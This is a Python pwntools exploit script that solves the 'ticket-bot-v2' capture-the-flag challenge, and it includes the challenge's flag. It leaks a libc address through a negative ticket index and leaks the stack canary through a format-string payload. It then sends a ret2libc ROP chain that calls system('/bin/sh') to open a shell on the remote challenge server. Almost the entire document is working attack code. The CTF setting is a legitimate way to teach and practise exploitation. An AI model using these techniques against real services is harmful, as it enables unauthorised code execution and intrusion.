```python
#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


debug = 0

if args.LOCAL:
    r = process([exe.path])
    if debug:
        gdb.attach(r, gdbscript='''
            b *adminpass+102
            c
            ''')
        input()
else:
    r = remote("ticket-bot-v2.challs.csc.tf", 1337)







def new_ticket(payload):
    r.sendlineafter(b"========================", b"1")
    r.sendafter(b"Please tell me why your here:", payload)

def view_ticket(ticket_id):
    r.sendlineafter(b"========================", b"2")
    r.sendlineafter(b"please enter your ticketID\n", f"{ticket_id}".encode())

def service_login(password):
    r.sendlineafter(b"========================", b"3")
    r.sendlineafter(b"Admin Password", f"{password}".encode())

def admin_menu(new_password):
    r.sendlineafter(b"========================", b"1")
    r.sendlineafter(b"new Password", new_password)
    r.recvuntil(b"Password changed to")


def main():

    r.sendafter(b"your here:", b"A"*32)

    # Leak libc:
    for _ in range(1, 5):
        new_ticket(b"A"*32)
    
    payload = b"A"*8 # password is now 0x41414141
    payload += p32(0xffffffff) # currentticketid
    payload = payload.ljust(32, b"A")
    new_ticket(payload) # id=5
    
    view_ticket(-1)
    #test = r.recv(8)
    #print(test)
    #r.interactive()


    libc.address = u64(r.recv(8)) - 0x1ed6a0
    print("[*] libc: ", hex(libc.address))
    ##



    # Leak canary
    service_login(0x41414141)
    admin_menu(b"%7$p")
    r.recvline()
    canary = int(r.recvline()[:18], 16)
    print("[*] canary: ", hex(canary))


    # ret2win
    pop_rdi = libc.address + 0x0000000000023b6a
    binsh = next(libc.search(b'/bin/sh'))
    ret = libc.address + 0x00000000000be2f9


    payload = b"A"*0x8
    payload += p64(canary)
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(ret)
    payload += p64(libc.sym['system'])


    service_login(0x41414141)
    admin_menu(payload)
    # good luck pwning :)

    r.interactive()

    # CSCTF{4rr4ys_4nd_th3re_1nd3x3s_h4ndl3_w1th_c4r3}

if __name__ == "__main__":
    main()

```
